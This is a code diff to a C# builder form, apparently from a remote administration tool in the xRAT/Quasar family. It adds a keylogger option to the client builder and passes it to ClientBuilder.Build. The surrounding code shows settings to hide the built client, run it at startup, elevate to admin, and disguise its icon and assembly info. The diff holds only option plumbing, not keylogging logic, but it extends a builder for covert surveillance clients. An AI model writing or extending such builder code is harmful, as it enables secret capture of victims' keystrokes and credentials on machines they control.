@@ -42,6 +42,9 @@ namespace xServer.Forms
             chkElevation.Checked = bool.Parse(pm.ReadValue("AdminElevation"));
             chkIconChange.Checked = bool.Parse(pm.ReadValue("ChangeIcon"));
             chkChangeAsmInfo.Checked = bool.Parse(pm.ReadValue("ChangeAsmInfo"));
+            chkKeylogger.Checked =
+                bool.Parse(!string.IsNullOrEmpty(pm.ReadValue("Keylogger")) ? pm.ReadValue("Keylogger") : "False");
+                //fallback
             txtProductName.Text = pm.ReadValue("ProductName");
             txtDescription.Text = pm.ReadValue("Description");
             txtCompanyName.Text = pm.ReadValue("CompanyName");
@@ -71,6 +74,7 @@ namespace xServer.Forms
             pm.WriteValue("AdminElevation", chkElevation.Checked.ToString());
             pm.WriteValue("ChangeIcon", chkIconChange.Checked.ToString());
             pm.WriteValue("ChangeAsmInfo", chkChangeAsmInfo.Checked.ToString());
+            pm.WriteValue("Keylogger", chkKeylogger.Checked.ToString());
             pm.WriteValue("ProductName", txtProductName.Text);
             pm.WriteValue("Description", txtDescription.Text);
             pm.WriteValue("CompanyName", txtCompanyName.Text);
@@ -299,7 +303,8 @@ namespace xServer.Forms
 
                         ClientBuilder.Build(output, txtHost.Text, txtPassword.Text, txtInstallsub.Text,
                             txtInstallname.Text + ".exe", txtMutex.Text, txtRegistryKeyName.Text, chkInstall.Checked,
-                            chkStartup.Checked, chkHide.Checked, int.Parse(txtPort.Text), int.Parse(txtDelay.Text),
+                            chkStartup.Checked, chkHide.Checked, chkKeylogger.Checked, int.Parse(txtPort.Text),
+                            int.Parse(txtDelay.Text),
                             GetInstallPath(), chkElevation.Checked, icon, asmInfo, Application.ProductVersion);
 
                         MessageBox.Show("Successfully built client!", "Success", MessageBoxButtons.OK,
@@ -442,6 +447,11 @@ namespace xServer.Forms
         }
 
         private void txtFileVersion_TextChanged(object sender, EventArgs e)
+        {
+            HasChanged();
+        }
+
+        private void chkKeylogger_CheckedChanged(object sender, EventArgs e)
         {
             HasChanged();
         }
